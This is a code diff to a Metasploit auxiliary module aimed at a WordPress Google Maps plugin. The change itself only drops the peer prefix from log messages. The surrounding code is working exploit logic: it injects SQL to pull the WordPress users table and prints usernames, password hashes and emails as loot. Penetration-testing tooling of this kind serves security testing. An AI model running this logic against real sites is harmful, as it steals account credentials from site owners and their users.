@@ -66,7 +66,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    print_status("#{peer} - Trying to retrieve the #{datastore['DB_PREFIX']}users table...")
+    print_status("Trying to retrieve the #{datastore['DB_PREFIX']}users table...")
 
     body = send_sql_request("* from #{datastore['DB_PREFIX']}users")
     fail_with(Failure::UnexpectedReply, 'No response or unexpected status code in response') if body.nil?
@@ -78,14 +78,14 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if body.empty?
-      print_error("#{peer} - Failed to retrieve the table #{datastore['DB_PREFIX']}users")
+      print_error("Failed to retrieve the table #{datastore['DB_PREFIX']}users")
     else
       loot = store_loot('wp_google_maps.json', 'application/json', rhost, body.to_s)
       print_good("Credentials saved in: #{loot}")
     end
 
     body.each do |user|
-      print_good("#{peer} - Found #{user['user_login']} #{user['user_pass']} #{user['user_email']}")
+      print_good("Found #{user['user_login']} #{user['user_pass']} #{user['user_email']}")
       connection_details = {
         module_fullname: fullname,
         username: user['user_login'],
